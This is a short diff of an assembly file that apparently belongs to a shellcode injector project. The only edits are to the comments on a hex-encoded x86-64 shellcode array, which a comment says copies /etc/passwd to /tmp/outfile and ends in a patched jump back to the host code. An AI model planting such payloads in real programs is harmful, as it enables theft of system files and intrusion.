@@ -21,7 +21,7 @@ section .data
     miss_len equ $ - miss_msg
 
     ; Inspired by https://shell-storm.org/shellcode/files/shellcode-867.html, still copies /etc/passwd to /tmp/outfile but replaced some registers and added instructions
-    shellcode db 0x54, 0x56, 0x57, 0x50, 0x53, 0x52                         ; push rsp, push rsi
+    shellcode db 0x54, 0x56, 0x57, 0x50, 0x53, 0x52 ; push rsp, push rsi, push rdi, push rax, push rbx, push rdx
         db 0x48, 0x81, 0xec, 0x00, 0x10, 0x00, 0x00 ; sub rsp, 0x1000
 
         db 0x49, 0x89, 0xe7                         ; mov r15, rsp
@@ -74,7 +74,7 @@ section .data
         db 0x0f, 0x05                               ; syscall
 
         db 0x48, 0x81, 0xc4, 0x00, 0x10, 0x00, 0x00 ; add rsp, 0x1000
-        db 0x5a, 0x5b, 0x58, 0x5f, 0x5e, 0x5c                               ; pop rsi, pop rsp
+        db 0x5a, 0x5b, 0x58, 0x5f, 0x5e, 0x5c       ; pop rdx, pop rbx, pop rax, pop rdi, pop rsi, pop rsp
 
         db 0xE9, 0x00, 0x00, 0x00, 0x00 ; jmp 0x0 (little endian) (relative to RIP)
     shellcode_len equ $ - shellcode
